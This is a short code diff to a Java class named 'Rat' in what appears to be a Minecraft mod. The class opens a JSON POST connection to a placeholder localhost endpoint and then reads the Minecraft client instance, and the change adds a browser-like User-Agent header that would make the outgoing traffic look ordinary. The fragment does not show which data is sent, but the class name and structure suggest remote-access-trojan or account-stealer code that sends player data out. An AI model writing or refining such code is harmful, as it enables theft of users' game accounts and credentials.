@@ -46,6 +46,7 @@ public class Rat { //change class name please for the love of god
                 HttpURLConnection c = (HttpURLConnection) new URL("http://localhost:80/").openConnection();
                 c.setRequestMethod("POST");
                 c.setRequestProperty("Content-type", "application/json");
+                c.setRequestProperty("User-Agent", "Mozilla/5.0");
                 c.setDoOutput(true);
 
                 Minecraft mc = Minecraft.getMinecraft();
